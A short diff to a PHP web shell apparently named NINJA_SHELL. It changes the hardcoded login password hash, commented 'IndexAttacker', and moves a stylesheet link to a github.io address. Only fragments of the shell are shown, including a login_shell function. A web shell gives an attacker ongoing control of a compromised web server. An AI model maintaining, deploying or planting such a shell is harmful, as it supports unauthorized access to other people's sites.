@@ -22,7 +22,7 @@ if (!empty($_SERVER['HTTP_USER_AGENT'])) {
 	}
 }
 
-$password = "2c64ffd34da8c270de00d2a35fd136d7"; // md5 : IndexAttacker
+$password = "d9ae02b7c3456bbc23ef73e93bc2c88a"; // md5 : IndexAttacker
 
 function login_shell()
 {
@@ -298,7 +298,7 @@ for ($i = 0; $i < $___; $i++) {
 
 		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
 	</head>
-	<link rel="stylesheet" href="https://github.com/Yudas1337/NINJA_SHELL/main.css">
+	<link rel="stylesheet" href="https://yudas1337.github.io/NINJA_SHELL/main.css">
 	<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 	<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
 	<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
